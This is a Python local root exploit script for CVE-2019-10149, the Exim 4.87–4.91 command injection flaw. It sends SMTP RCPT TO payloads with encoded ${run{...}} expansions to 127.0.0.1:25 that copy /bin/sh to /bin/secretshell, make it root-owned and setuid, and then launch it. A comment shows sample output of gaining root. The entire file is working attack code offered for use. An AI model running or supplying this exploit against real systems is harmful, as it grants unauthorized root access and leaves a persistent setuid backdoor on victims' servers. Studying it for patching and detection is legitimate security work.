#!/usr/bin/env python3
# local root exploit for cve-2019-10149, a command injection vulnerability
# in exim4 4.87 -> 4.91. this exploit creates a setuid root binary in 
# /bin/secretshell to launch a root shell. This is an exploit for the issue
# described in "return-wizard-rce-exim.txt" by Qualys.
# 
# e.g.
#  backupsrv@hacklab01:/tmp$ python x.py
#  [ Exim >= 4.87 & <= 4.91 cve-2019-10149 local root exploit
#  # id
#  uid=1008(backupsrv) gid=1008(backupsrv) euid=0(root) groups=1008(backupsrv)
#
# to clean up just rm -rf /bin/secretshell 
#
# -- Hacker Fantastic (https://hacker.house)
import socket
import time
import sys
import os

cmd0 = b"RCPT TO: <${run{\\x2Fbin\\x2Fsh\\t-c\\t\\x22cp\\t\\x2Fbin\\x2Fsh\\t\\x2Fbin\\x2F\\secretshell\\x22}}@localhost>\r\n"
cmd1 = b"RCPT TO: <${run{\\x2Fbin\\x2Fsh\\t-c\\t\\x22chown\\troot\\x3Aroot\\t\\x2Fbin\\x2F\\secretshell\\x22}}@localhost>\r\n"
cmd2 = b"RCPT TO: <${run{\\x2Fbin\\x2Fsh\\t-c\\t\\x22chmod\\t4755\\t\\x2Fbin\\x2Fsecretshell\\x22}}@localhost>\r\n"

def exploit(cmd):
	sd = socket.socket()
	sd.connect(("127.0.0.1",25))
	buf = sd.recv(1024)
	sd.send(b"EHLO x\r\n")
	buf = sd.recv(1024)
	sd.send(b"MAIL FROM: <>\r\n")
	buf = sd.recv(1024)
	sd.send(cmd)
	buf = sd.recv(1024)
	sd.send(b"DATA\r\n")
	for count in range(0,31):
		outbuf = b"Received: %d\r\n" % count
		sd.send(outbuf)
	sd.send(b"\r\n.\r\n")
	buf = sd.recv(1024)
	sd.send(b"QUIT\r\n")
	sd.close()

if __name__ == "__main__":
	print("[ Exim >= 4.87 & <= 4.91 cve-2019-10149 local root exploit")
	exploit(cmd0)
	exploit(cmd1)
	exploit(cmd2)
	time.sleep(1)
	os.system("/bin/secretshell -p")
